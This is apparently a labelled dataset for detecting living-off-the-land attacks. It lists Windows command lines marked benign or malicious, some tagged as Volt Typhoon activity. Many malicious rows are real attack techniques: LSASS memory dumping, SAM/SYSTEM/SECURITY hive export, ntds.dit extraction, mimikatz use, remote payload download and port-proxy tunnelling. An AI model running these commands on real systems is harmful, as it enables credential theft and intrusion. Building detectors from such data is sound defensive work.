command,label,source,command_id
"copy.exe ""D:\Windows\ajnhwyf.sys"" ""C:\Users\crfqrqe\Documents\Pictures\uwxvzqtdl.dat""",0,combined_lotl,1138
wab.exe,1,combined_lotl,1139
"rmdir.exe ""C:\Windows\Users"" /s /q",0,combined_lotl,1140
ping 192.168.165.96,0,combined_lotl,1141
"findstr.exe /C:""eT5dB4MHdVeD"" ""C:\Temp\Temp\asuwlw.dat""",0,combined_lotl,1142
C:\Windows\System32\ping.exe 192.168.220.186,0,combined_lotl,1143
Update.exe --download {REMOTEURL},1,combined_lotl,1144
"findstr.exe /C:""XjGDkacHLrny"" ""D:\Logs\Program Files\jihxvtx.txt""",0,combined_lotl,1145
regasm.exe /U {PATH:.dll},1,combined_lotl,1146
"certutil -hashfile ""C:\Program Files\okdubbkavh.exe"" SHA256",0,combined_lotl,1147
"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""",1,combined_lotl,1148
SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat},1,combined_lotl,1149
"powershell -Command ""Get-ChildItem -Path D:\Users\Logs -Recurse | Select-Object FullName, Length""",0,combined_lotl,1150
"attrib +h ""C:\Logs\laaputwwvr.txt""",0,combined_lotl,1151
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Windows\qguoedqkb.log\"" \""D:\Program Files\Users\sbgwmi.dat\"""" /sc daily /st 23:00",0,combined_lotl,1152
"echo.exe %DATE% %TIME% >> ""D:\Windows\tbdfbmufw.sys""",0,combined_lotl,1153
start ms-appinstaller://?source={REMOTEURL:.exe},1,combined_lotl,1154
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe,1,combined_lotl,1155
cmstp.exe /ni /s {PATH_ABSOLUTE:.inf},1,combined_lotl,1156
ping 192.168.230.65,0,combined_lotl,1157
"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""",1,combined_lotl,1158
"move ""D:\Program Files\Program Files\sunou.exe"" ""D:\Program Files\Users\bnlrlspaps.ini""",0,combined_lotl,1159
"C:\Windows\System32\attrib.exe +h ""D:\Program Files\Temp\cxesz.sys""",0,combined_lotl,1160
net localgroup Administrators evfhrzpg /add,0,combined_lotl,1161
"""C:\pstools\psexec.exe"" {REDACTED} -s cmd /c ""cmd.exe /c netsh
interface portproxy delete v4tov4 listenaddress=0.0.0.0
listenport=9999",1,combined_lotl,1162
"move.exe ""C:\Windows\Temp\xacir.log"" ""C:\Logs\Logs\zflartl.dat""",0,combined_lotl,1163
"certutil -hashfile ""C:\Users\Program Files\ztordbie.exe"" SHA256",0,combined_lotl,1164
tar -xf {PATH_SMB:.tar},1,combined_lotl,1165
msiexec /quiet /i {PATH:.msi},1,combined_lotl,1166
"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\"" q q",1,combined_lotl,1167
C:\Windows\net.exe user uyzwultt /add,0,combined_lotl,1168
"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",1,combined_lotl,1169
"powershell.exe -Command ""Get-ChildItem -Path D:\Users\bmgfogln\Documents\Desktop -Recurse | Select-Object FullName, Length""",0,combined_lotl,1170
net.exe localgroup Administrators odqhpbsz /add,0,combined_lotl,1171
"fsutil.exe file layout ""C:\Logs\rxheguolq.ini""",0,combined_lotl,1172
for {%% | %}<variable> in (<set>) do <command> [<commandlineoptions>],0,combined_lotl,1173
echo.exe 8J7Og2UQIO5I > C:\Windows\ycmmmls.ini,0,combined_lotl,1174
%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,1,combined_lotl,1175
"type ""D:\Temp\qvtuec.ini""",0,combined_lotl,1176
net.exe user mliimpjg /add,0,combined_lotl,1177
"findstr.exe /C:""4tNo5PUQ0DBo"" ""C:\Program Files\qrvpgds.ini""",0,combined_lotl,1178
diantz /f {PATH:.ddf},1,combined_lotl,1179
"move.exe ""C:\Logs\AppData\obnmhcgnrx.ini"" ""D:\Windows\gjouivhhu.ini""",0,combined_lotl,1180
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll},1,combined_lotl,1181
"rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta",1,combined_lotl,1182
rescan,0,combined_lotl,1183
"D:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",1,combined_lotl,1184
"echo %DATE% %TIME% >> ""D:\Program Files\ptkicucqvg.dat""",0,combined_lotl,1185
Powerpnt.exe {REMOTEURL},1,combined_lotl,1186
regedit {PATH_ABSOLUTE}:regfile.reg.exe,1,combined_lotl,1187
certutil.exe -URL {REMOTEURL:.exe},1,combined_lotl,1188
print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,1189
E:\Windows\fsutil.exe volume [querycluster] C:\Logs\Users <cluster> [<cluster>] …,0,combined_lotl,1190
"C:\Windows\powershell.exe -Command ""Get-ChildItem -Path C:\Users\xujmxaa\Desktop\Pictures -Recurse | Select-Object FullName, Length""",0,combined_lotl,1191
net use Z: \\192.168.28.157\public,0,combined_lotl,1192
"sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice",1,combined_lotl,1193
"copy.exe ""C:\Windows\Logs\dxdhmumstp.dll"" ""D:\Logs\ufbewg.sys""",0,combined_lotl,1194
pixtool.exe launch {PATH_ABSOLUTE:.exe},1,combined_lotl,1195
"rmdir ""C:\Program Files\AppData"" /s /q",0,combined_lotl,1196
"D:\Windows\dir.exe ""C:\Logs\Users""",0,combined_lotl,1197
net.exe localgroup Administrators rhxfwsoj /add,0,combined_lotl,1198
Presentationhost.exe {REMOTEURL},1,combined_lotl,1199
C:\Program Files (x86)\cmd.exe /c dir C:\Temp,0,combined_lotl,1200
ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL},1,combined_lotl,1201
cmd.exe /Q /c *dir 1> \\127.0.0.1\ADMIN$\__1684956600.123456 2>&1,1,combined_lotl,1202
"C:\Windows\System32\move.exe ""D:\AppData\Windows\mdoxrdp.sys"" ""C:\AppData\bwwxzqr.dll""",0,combined_lotl,1203
"findstr /C:""5PaR0rAUJw4H"" ""D:\AppData\Logs\uxeoqnt.exe""",0,combined_lotl,1204
"rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}",1,combined_lotl,1205
echo.exe !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt,1,combined_lotl,1206
net use Z: \\192.168.114.184\data,0,combined_lotl,1207
"attrib +h ""D:\Logs\nddefnrnzg.sys""",0,combined_lotl,1208
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\AppData\ficmyzx.dll\"" \""C:\Temp\AppData\ghrcxpqhtv.dll\"""" /sc daily /st 23:00",0,combined_lotl,1209
"echo GetObject(""script:{REMOTEURL:.js}"") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js",1,combined_lotl,1210
"copy ""C:\Temp\Temp\bsulbijarm.exe"" ""D:\Temp\Program Files\jdhtmzw.txt""",0,combined_lotl,1211
Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll,1,combined_lotl,1212
esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o,1,combined_lotl,1213
"rmdir.exe ""C:\Windows\Program Files"" /s /q",0,combined_lotl,1214
"arp.exe -a
curl.exe www.ip-api[.]com
dnscmd.exe . /enumrecords /zone {REDACTED}
dnscmd.exe . /enumzones
dnscmd.exe /enumrecords {REDACTED} . /additional
ipconfig.exe /all
ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree
net.exe localgroup administrators
net.exe group /dom net.exe group ""Domain Admins"" /dom
netsh.exe interface firewall show all
netsh.exe interface portproxy show all
netsh.exe interface portproxy show v4tov4
netsh.exe firewall show all
netsh.exe portproxy show v4tov4
netstat.exe -ano
reg.exe query hklm\software\
systeminfo.exe
tasklist.exe /v
whoami.exe
wmic.exe volume list brief
wmic.exe service brief
wmic.exe product list brief
wmic.exe baseboard list full
wevtutil.exe qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]",1,volttyphoon,1215
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""list all"" ""delete 1"" ""quit"" ""quit""",1,combined_lotl,1216
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat,1,combined_lotl,1217
net user jpuhhgip /add,0,combined_lotl,1218
C:\Windows\attrib.exe +r data.log,0,combined_lotl,1219
attributes volume [{set | clear}] [{hidden | readonly | nodefaultdriveletter | shadowcopy}] [noerr],0,combined_lotl,1220
"wmic.exe process call create ""cmd.exe /c ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\Pro""",1,volttyphoon,1221
echo.exe UKmxMovtCAWM > C:\AppData\cedxn.ini,0,combined_lotl,1222
"DefaultPack.EXE /C:""{CMD}""",1,combined_lotl,1223
chap target set secret=[dtYFbV6kjI6ilFZ5] [initiator=iqn.2025-11.com.example:zzdcklpj],0,combined_lotl,1224
"C:\Windows\System32\fsutil.exe file layout ""D:\Users\Users\qcwgbrm.sys""",0,combined_lotl,1225
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE,1,combined_lotl,1226
"echo %DATE% %TIME% >> ""D:\Users\jdxrcy\Downloads\Documents\ehyscpthyp.log""",0,combined_lotl,1227
net user sfwsqaux /add,0,combined_lotl,1228
"del ""C:\Windows\mgushnr.ini"" /f /q",0,combined_lotl,1229
diskshadow/list/reset,0,combined_lotl,1230
wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer,1,combined_lotl,1231
"$DCs = Get-ADDomainController -Filter /$startDate = (get-date).AddDays(-1)/foreach ($DC in $DCs){
$slogonevents = Get-Eventlog -LogName
Security -ComputerName $DC.Hostname -
after $startDate | where {$_.eventID -eq
4624 }}/foreach ($e in $slogonevents){
# Logon Successful Events
# Local (Logon Type 2)
if (($e.EventID -eq 4624 ) -and
($e.ReplacementStrings[8] -eq 2)){
write-host ""Type: Local Logon`tDate:
""$e.TimeGenerated ""`tStatus:
Success`tUser: ""$e.ReplacementStrings[5]
""`tWorkstation: ""$e.ReplacementStrings[11]
}/if (($e.EventID -eq 4624 ) -and
($e.ReplacementStrings[8] -eq 10)){
write-host ""Type: Remote Logon`tDate:
""$e.TimeGenerated ""`tStatus:
Success`tUser: ""$e.ReplacementStrings[5]
""`tWorkstation: ""$e.ReplacementStrings[11]
""`tIP Address: ""$e.ReplacementStrings[18]
}}",1,volttyphoon,1232
net.exe localgroup Administrators inqfovpw /add,0,combined_lotl,1233
"powershell.exe -Command ""Get-Service""",0,combined_lotl,1234
"findstr /C:""zxrC0ddHOySf"" ""D:\Users\womof.exe""",0,combined_lotl,1235
adplus.exe -c {PATH:.xml},1,combined_lotl,1236
conhost.exe {CMD},1,combined_lotl,1237
add volume <volume> [provider 5c79240e-eab2-4853-8d13-ba024bcaef27],0,combined_lotl,1238
"move.exe ""C:\Users\gqzmx\Desktop\Desktop\aifxqhyqz.log"" ""C:\Users\Logs\hnfnvwhtu.dll""",0,combined_lotl,1239
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\qjrtbekx\Pictures\siwocg.txt\"" \""C:\Temp\Logs\orlswmf.txt\"""" /sc daily /st 23:00",0,combined_lotl,1240
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}""",1,combined_lotl,1241
C:\Windows\System32\echo.exe r5zy0mbz1FNw > C:\Users\cbato\Documents\Pictures\ewozzvfad.dat,0,combined_lotl,1242
"findstr /C:""HV5AVJM2hi9J"" ""D:\Program Files\eqnmb.ini""",0,combined_lotl,1243
"move ""C:\Users\ektjzkv\Desktop\Desktop\pkiga.sys"" ""C:\Users\lhtpcjpmhq.sys""",0,combined_lotl,1244
setres.exe -w 800 -h 600,1,combined_lotl,1245
replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A,1,combined_lotl,1246
"icacls ""D:\Windows\wdlihtdh.exe"" /grant Everyone:F",0,combined_lotl,1247
net user awggwrxv /add,0,combined_lotl,1248
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\wzhlbbbo.exe\"" \""D:\Logs\hhjgbj.ini\"""" /sc daily /st 23:00",0,combined_lotl,1249
"C:\Windows\mkdir.exe ""D:\Logs\Users""",0,combined_lotl,1250
net user qvcalkrw /add,0,combined_lotl,1251
"attrib +h ""D:\Logs\swhnsepvn.exe""",0,combined_lotl,1252
"create lun mirror [size=504] [drives=<n, n> [,...]] [stripesize=504] [noerr]",0,combined_lotl,1253
"C:\Windows\System32\mkdir.exe ""D:\Users\bstg\Desktop""",0,combined_lotl,1254
provlaunch.exe LOLBin,1,combined_lotl,1255
C:\Windows\net.exe user hfzavbmr /add,0,combined_lotl,1256
fsutil behavior set {allowextchar {1|0} | bugcheckoncorrupt {1|0} | disable8dot3 [ <value> | [D:\Users {1|0}] ] | disablecompression {1|0} | disablecompressionlimit {1|0} | disableencryption {1|0} | disablefilemetadataoptimization {1|0} | disablelastaccess {1|0} | disablespotcorruptionhandling {1|0} | disabletxf {1|0} | disablewriteautotiering {1|0} | encryptpagingfile {1|0} | mftzone <Value> | memoryusage <Value> | quotanotify <frequency> | symlinkevaluation <symboliclinktype> | disabledeletenotify {1|0}}fsutil behavior query disable8dot3 volume{928842df-5a01-11de-a85c-806e6f6e6963},0,combined_lotl,1257
Pcwrun.exe /../../$(calc).exe,1,combined_lotl,1258
"certutil -hashfile ""C:\Users\Users\lgcmwkmm.exe"" SHA256",0,combined_lotl,1259
"findstr.exe /C:""bnFbwzJtTKL7"" ""D:\Windows\Windows\mjfwlbpy.sys""",0,combined_lotl,1260
findstr [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:<file>] [/c:<string>] [/g:<file>] [/d:<dirlist>] [/a:<colorattribute>] [/off[line]] <strings> [<drive>:][<path>]<filename>[ ...],0,combined_lotl,1261
Mftrace.exe {PATH:.exe},1,combined_lotl,1262
fsi.exe,1,combined_lotl,1263
Vsjitdebugger.exe {PATH:.exe},1,combined_lotl,1264
echo F8qrdiJcVLPw > C:\AppData\Windows\ojyfldwo.txt,0,combined_lotl,1265
esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o,1,combined_lotl,1266
"attrib.exe +h ""D:\Users\ntcim.dat""",0,combined_lotl,1267
forfiles [/P pathname] [/M searchmask] [/S] [/C command] [/D [+ | -] [{<date> | <days>}]],0,combined_lotl,1268
echo.exe shcdahIrBh37 > C:\Program Files\Windows\eftlrdyuli.dll,0,combined_lotl,1269
"copy.exe ""D:\AppData\wmmzz.txt"" ""D:\Logs\AppData\azqeaut.sys""",0,combined_lotl,1270
C:\Windows\reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0,combined_lotl,1271
echo 3vxNFGSCz1EG > C:\Users\Program Files\wierhplla.exe,0,combined_lotl,1272
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,1,combined_lotl,1273
"dir.exe ""C:\Users\nocnclh\Documents"" /s /b",0,combined_lotl,1274
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)               Gecko/20100101 Firefox/68.0,1,combined_lotl,1275
pnputil.exe -i -a {PATH_ABSOLUTE:.inf},1,combined_lotl,1276
C:\Windows\echo.exe AGA8LNAgy7yV > C:\Logs\Temp\iddlifm.txt,0,combined_lotl,1277
"msedgewebview2.exe --no-sandbox --browser-subprocess-path=""{PATH_ABSOLUTE:.exe}""",1,combined_lotl,1278
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe},1,combined_lotl,1279
"findstr.exe /C:""hrdmZvdiVw2Z"" ""D:\Windows\qlolplwpkz.txt""",0,combined_lotl,1280
ntsd.exe -g {CMD},1,combined_lotl,1281
makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab,1,combined_lotl,1282
reset.exe session,1,combined_lotl,1283
"mkdir.exe ""C:\Users\ubtde\Desktop\Desktop""",0,combined_lotl,1284
"echo %DATE% %TIME% >> ""C:\Users\AppData\ualcvi.exe""",0,combined_lotl,1285
echo KNNSUeAKPSv4 > C:\Temp\Program Files\zfmvvins.dat,0,combined_lotl,1286
squirrel.exe --download {REMOTEURL},1,combined_lotl,1287
"attrib.exe +h ""C:\Program Files\qperuhcfw.dat""",0,combined_lotl,1288
"type ""C:\Program Files\iivxvc.log""",0,combined_lotl,1289
net.exe localgroup Administrators vszseqjf /add,0,combined_lotl,1290
Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,1,combined_lotl,1291
"rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}",1,combined_lotl,1292
"wmic.exe process call create ""{CMD}""",1,combined_lotl,1293
tttracer.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,1294
"fsutil file layout ""D:\Users\kswqfss\Pictures\Pictures\xpdvxzja.exe""",0,combined_lotl,1295
"attrib +h ""D:\Program Files\spckyybfj.dat""",0,combined_lotl,1296
Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe},1,combined_lotl,1297
"associate controllers [add] 943[,943 [,…]]",0,combined_lotl,1298
"del ""D:\Logs\gwathbk.ini"" /f /q",0,combined_lotl,1299
ftp/gpresult.exe /s srvmain /u maindom\hiropln /p p@ssW23 /r,0,volttyphoon,1300
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab,1,combined_lotl,1301
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe""",1,combined_lotl,1302
change.exe user,1,combined_lotl,1303
for /f [usebackq <parsingkeywords>] {%%|%}<variable> in (<set>) do <command> [<commandlineoptions>],0,combined_lotl,1304
scanline.exe -t 192.168.1.0/24 -p 1-65535,1,volttyphoon,1305
fsutil.exe 8dot3name [query] [D:\Logs\AppData],0,combined_lotl,1306
HH.exe {REMOTEURL:.chm},1,combined_lotl,1307
net localgroup Administrators ubgeaxue /add,0,combined_lotl,1308
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",1,combined_lotl,1309
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\tphjdy.sys\"" \""C:\Users\Program Files\ztmqpbddeq.log\"""" /sc daily /st 23:00",0,combined_lotl,1310
"attrib.exe +h ""C:\AppData\Program Files\chjjuty.dll""",0,combined_lotl,1311
odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}},1,combined_lotl,1312
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\mewizr.txt\"" \""C:\AppData\Logs\fkzjqurm.txt\"""" /sc daily /st 23:00",0,combined_lotl,1313
"wmic.exe process get brief /format:""{PATH_SMB:.xsl}""",1,combined_lotl,1314
net.exe use Z: \\192.168.55.46\data,0,combined_lotl,1315
net localgroup Administrators wshbmwwo /add,0,combined_lotl,1316
"copy.exe ""D:\Program Files\lpseskai.dll"" ""C:\Windows\zyjbnyd.sys""",0,combined_lotl,1317
"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,",1,combined_lotl,1318
"findstr /C:""cQgjnTV5VSPx"" ""C:\Temp\dgelssl.exe""",0,combined_lotl,1319
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\Users\assgzudm.txt\"" \""D:\Users\alnl\Downloads\delpmp.txt\"""" /sc daily /st 23:00",0,combined_lotl,1320
"certutil.exe -hashfile ""D:\AppData\Users\wxpbwq.txt"" SHA256",0,combined_lotl,1321
"fsutil.exe file layout ""D:\Users\Program Files\jjeqye.dll""",0,combined_lotl,1322
setflag drive hotspare={true | false},0,combined_lotl,1323
"fsutil.exe file layout ""D:\Users\cmsgzs\Downloads\Downloads\ctmjkygokd.dll""",0,combined_lotl,1324
"dir C:\Users\{REDACTED}\.ssh\known_hosts
dir C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profiles
mimikatz.exe
reg query hklm\software\OpenSSH
reg query hklm\software\OpenSSH\Agent
reg query hklm\software\realvnc
reg query hklm\software\realvnc\vncserver
reg query hklm\software\realvnc\Allusers
reg query hklm\software\realvnc\Allusers\vncserver
reg query hkcu\software\{REDACTED}\putty\session
reg save hklm\sam ss.dat
reg save hklm\system sy.dat",1,combined_lotl,1325
ngen.exe {REMOTEURL},1,combined_lotl,1326
rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full,1,combined_lotl,1327
ping 192.168.93.18,0,combined_lotl,1328
"echo.exe %DATE% %TIME% >> ""C:\Windows\Temp\xtrel.txt""",0,combined_lotl,1329
"del ""C:\Logs\iwyjc.sys"" /f /q",0,combined_lotl,1330
echo.exe cSZ9y5YffCZe > C:\Logs\suxszn.dll,0,combined_lotl,1331
"fsutil file layout ""C:\Windows\jlgdts.exe""",0,combined_lotl,1332
1 provider registered./add volume c: alias System1,0,combined_lotl,1333
repair disk=4,0,combined_lotl,1334
"mkdir ""D:\Logs\Logs""",0,combined_lotl,1335
"findstr.exe /C:""DGzxGMooy0T3"" ""C:\Logs\ldsyu.sys""",0,combined_lotl,1336
makecab /F {PATH:.ddf},1,combined_lotl,1337
"wsl.exe --exec bash -c ""{CMD}""",1,combined_lotl,1338
"echo.exe %DATE% %TIME% >> ""C:\Logs\Windows\wflwa.sys""",0,combined_lotl,1339
ping.exe 192.168.210.124,0,combined_lotl,1340
"dir.exe ""C:\Logs"" /s /b",0,combined_lotl,1341
"fsutil file layout ""D:\Users\zjqnisca\Downloads\xeibo.txt""",0,combined_lotl,1342
"""cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=""",1,combined_lotl,1343
C:\Windows\System32\net.exe localgroup Administrators user1 /add,0,combined_lotl,1344
pktmon.exe start --etw,1,combined_lotl,1345
net.exe use Z: \\192.168.123.71\backup,0,combined_lotl,1346
"certutil -hashfile ""D:\Users\Temp\tfvpjsw.ini"" SHA256",0,combined_lotl,1347
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\bpvvz\Downloads\Desktop\vxqrgi.dat\"" \""D:\Windows\bjtgbbddq.sys\"""" /sc daily /st 23:00",0,combined_lotl,1348
"certutil.exe -hashfile ""C:\Program Files\kbadtmw.dll"" SHA256",0,combined_lotl,1349
"certutil.exe -hashfile ""C:\Windows\ruovke.log"" SHA256",0,combined_lotl,1350
"move.exe ""D:\Logs\nawhcnss.dll"" ""C:\Temp\lydvjdpvu.txt""",0,combined_lotl,1351
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}",1,combined_lotl,1352
cmd.exe /c vssadmin.exe create shadow /for=C: > C:\Windows\Temp\<filename>.tmp cmd.exe /c copy.exe \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Temp\<filename>.tmp,1,volttyphoon,1353
"findstr /C:""GvVg8hgmJLLJ"" ""C:\Logs\jjkriq.sys""",0,combined_lotl,1354
VSDiagnostics.exe start 1 /launch:{PATH:.exe},1,combined_lotl,1355
@echo off,0,combined_lotl,1356
repair disk=53 [align=53] [noerr],0,combined_lotl,1357
echo.exe Yw5CMOKgniNx > C:\AppData\AppData\lofihvepmr.log,0,combined_lotl,1358
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL},1,combined_lotl,1359
"AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}",1,combined_lotl,1360
remove [{letter=E | mount=D:\Users\nqeyqyso\Documents [all]}] [noerr],0,combined_lotl,1361
"powershell -Command ""Get-ChildItem -Path D:\Program Files\AppData -Recurse | Select-Object FullName, Length""",0,combined_lotl,1362
net.exe use Z: \\192.168.133.21\data,0,combined_lotl,1363
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Program Files\Program Files\tgvncjlz.dat\"" \""D:\Users\hhifqz\Downloads\lsmouvf.sys\"""" /sc daily /st 23:00",0,combined_lotl,1364
"E:\Windows\powershell.exe -Command ""Get-ChildItem -Path C:\Program Files\Program Files -Recurse | Select-Object FullName, Length""",0,combined_lotl,1365
"dir.exe ""C:\Users\hfihnso\Downloads\Pictures""",0,combined_lotl,1366
"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}",1,combined_lotl,1367
net.exe user chxndonm /add,0,combined_lotl,1368
"E:\Windows\System32\attrib.exe +h ""D:\Users\eoge\Downloads\ykccw.dll""",0,combined_lotl,1369
"copy ""D:\Users\mmwkj.log"" ""C:\Users\maey\Pictures\cchivrpb.sys""",0,combined_lotl,1370
"attrib.exe +h ""D:\Users\rmrvbklb.ini""",0,combined_lotl,1371
"arp -a
curl www.ip-api[.]com
dnscmd . /enumrecords /zone {REDACTED}
dnscmd . /enumzones
dnscmd /enumrecords {REDACTED} . /additional
ipconfig /all
ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree
net localgroup administrators
net group /dom net group ""Domain Admins"" /dom
netsh interface firewall show all
netsh interface portproxy show all
netsh interface portproxy show v4tov4
netsh firewall show all
netsh portproxy show v4tov4
netstat -ano
reg query hklm\software\
systeminfo
tasklist /v
whoami
wmic volume list brief
wmic service brief
wmic product list brief
wmic baseboard list full
wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]
",1,combined_lotl,1372
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""quit"" ""quit""",1,combined_lotl,1373
net use Z: \\192.168.42.219\public,0,combined_lotl,1374
msxsl.exe {PATH:.xml} {PATH:.xsl},1,combined_lotl,1375
bcdedit /enum all,0,combined_lotl,1376
"findstr /C:""VRbHgmO2LqHO"" ""D:\Program Files\Logs\mcmyppfszu.exe""",0,combined_lotl,1377
"copy.exe ""D:\Logs\oegzl.ini"" ""C:\Users\alqnwb\Pictures\smapioaqcp.ini""",0,combined_lotl,1378
assign e:,0,combined_lotl,1379
net.exe localgroup Administrators snlyeonb /add,0,combined_lotl,1380
net user qsxxqyom /add,0,combined_lotl,1381
C:\Windows\System32\echo.exe GmyTfq6NxcxU > C:\Users\dgve\Documents\Desktop\cfipfzwg.dll,0,combined_lotl,1382
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Windows\lxjgn.exe\"" \""C:\Windows\mgeygl.txt\"""" /sc daily /st 23:00",0,combined_lotl,1383
reg.exe save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak},1,combined_lotl,1384
"C:\Windows\fsutil.exe file layout ""D:\Users\rmqc\Downloads\ozgcpfu.log""",0,combined_lotl,1385
ilasm.exe {PATH_ABSOLUTE:.txt} /exe,1,combined_lotl,1386
